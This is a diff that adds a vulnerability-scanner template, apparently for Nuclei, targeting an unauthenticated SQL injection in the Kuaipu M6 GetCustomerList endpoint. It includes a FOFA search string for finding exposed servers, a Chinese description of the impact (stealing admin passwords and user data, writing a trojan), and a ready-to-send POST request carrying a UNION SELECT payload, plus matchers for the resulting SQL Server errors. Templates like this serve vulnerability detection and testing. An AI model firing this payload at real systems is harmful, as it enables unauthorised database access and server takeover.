@@ -1,0 +1,29 @@
+id: kuaipuM6-GetCustomerList-sql
+
+info:
+  tags: kuaipuM6-GetCustomerList-sql
+  name: 快普M6 GetCustomerList SQL注入漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="Resource/JavaScript/jKPM6.DateTime.js"
+    快普M6 GetCustomerList 接口存在SQL注入漏洞,未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+http:
+  - raw:
+      - |
+        POST /WebService/wsAutoComplete.asmx/GetCustomerList HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        prefixText=a'+UNION+ALL+SELECT+@@VERSION,NULL--&count=1&contextKey=a
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '转换成数据类型 int 时失败'
+          - '在将 nvarchar 值'
+        condition: and
+      - type: status
+        status: 
+          - 500
